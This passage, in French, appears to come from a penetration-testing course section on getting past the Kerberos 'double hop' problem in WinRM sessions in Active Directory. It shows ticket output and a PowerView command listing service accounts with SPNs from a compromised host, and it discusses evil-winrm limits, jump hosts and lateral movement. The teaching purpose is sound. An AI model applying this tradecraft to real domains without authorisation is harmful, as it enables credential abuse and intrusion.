       Session Key Type: AES-256-CTS-HMAC-SHA1-96
       Cache Flags: 0x1 -> PRIMARY
       Kdc Called: DC01

```

Nous pouvons désormais exécuter des outils tels que PowerView sans avoir à créer un nouvel objet PSCredential.

  Problème de "double saut" Kerberos

```
[DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc

```

Remarque : nous ne pouvons pas utiliser `Register-PSSessionConfiguration`à partir d'un shell evil-winrm car nous ne pourrons pas obtenir la fenêtre contextuelle des informations d'identification. De plus, si nous essayons d'exécuter ceci en configurant d'abord un objet PSCredential, puis en essayant d'exécuter la commande en transmettant des informations d'identification telles que `-RunAsCredential $Cred`, nous obtiendrons une erreur car nous ne pouvons l'utiliser qu'à `RunAs`partir d'un terminal PowerShell élevé. Par conséquent, cette méthode ne fonctionnera pas via une session evil-winrm car elle nécessite un accès à l'interface graphique et une console PowerShell appropriée. De plus, lors de nos tests, nous n'avons pas pu faire fonctionner cette méthode à partir de PowerShell sur un hôte d'attaque Parrot ou Ubuntu en raison de certaines limitations sur la façon dont PowerShell sous Linux fonctionne avec les informations d'identification Kerberos. Cette méthode est toujours très efficace si nous testons à partir d'un hôte d'attaque Windows et disposons d'un ensemble d'informations d'identification ou compromettons un hôte et pouvons nous connecter via RDP pour l'utiliser comme « hôte de saut » pour lancer d'autres attaques contre des hôtes dans l'environnement. .

Nous pouvons également utiliser d'autres méthodes telles que CredSSP, la redirection de port ou l'injection dans un processus s'exécutant dans le contexte d'un utilisateur cible (processus sacrificiel) que nous n'aborderons pas ici.

* * * * *

Conclure
--------

Dans cette section, nous avons vu comment surmonter le problème du « double saut » Kerberos lorsque vous travaillez avec WinRM dans un environnement AD. Nous le rencontrerons souvent lors de nos évaluations, nous devons donc comprendre le problème et avoir certaines tactiques dans notre boîte à outils pour éviter de perdre du temps.

La section suivante couvrira d'autres moyens d'élever les privilèges et de se déplacer latéralement dans un domaine une fois que nous aurons des informations d'identification valides en utilisant diverses vulnérabilités critiques identifiées tout au long de 2021.
